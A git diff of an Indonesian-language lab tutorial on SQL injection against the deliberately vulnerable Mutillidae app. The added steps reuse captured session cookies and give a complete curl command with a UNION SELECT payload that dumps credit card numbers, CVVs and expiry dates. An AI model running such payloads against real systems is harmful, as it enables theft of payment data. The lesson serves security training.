@@ -65,7 +65,6 @@ Lesson 8 - SQL Injection Union Exploit #1
  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_10_49.png)
  
 - **Step 12** : Maka hasilnya, bagian username diisi oleh ccnnumber, password diisi oleh ccv, dan signature diisi oleh expiration. 
- 
  ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_12_04.png)
  
 
@@ -73,6 +72,11 @@ Lesson 8 - SQL Injection Union Exploit #1
 - **Step 1** : Buka Burp Suite dan cari log hasil sniffing pada **step 12** pada bagian SQL Injection (Union Example #1), kemudian catat/copas raw header request.
 ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_17_58.png)
 
+- **Step 2** : Copas Cookie pada hasil header dan masukkan pada file crack_cookies.txt
+ ![](/assets/lesson-8/VirtualBox_kali_19_12_2017_21_21_02.png)
+ 
+- **Step 3** : Jalankan perintah `curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.151.36.64/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'` dan lihat hasilnya.
+ 
 
 
 
